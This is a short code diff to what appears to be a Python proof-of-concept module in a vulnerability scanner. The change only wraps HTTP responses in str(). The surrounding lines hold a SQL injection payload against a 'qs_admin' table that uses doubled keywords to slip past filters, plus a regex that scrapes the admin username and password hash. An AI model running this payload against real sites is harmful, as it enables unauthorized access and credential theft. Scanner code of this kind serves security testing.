@@ -58,7 +58,7 @@ class Poc(ABPoc):
             verify_url = '{target}'.format(target=self.target)+payload
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if '3438d5e3ead84b2effc5ec33ed1239f5' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -80,7 +80,7 @@ class Poc(ABPoc):
                 "?act=key&key=asd%錦%27%20uniounionn%20selselectect%201,2,3,pwd_hash,5,6,7,8,9%20from%20qs_admin%20LIMIT%201%23")
             request = urllib.request.Request(vul_url + paload1)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             pattern = re.compile(
                 r'.*?<a[^>]*?>(?P<username>[^<>]*?)</a><span>(?P<password>[^<>]*?)</span>', re.I | re.S)
             match = pattern.match(content)
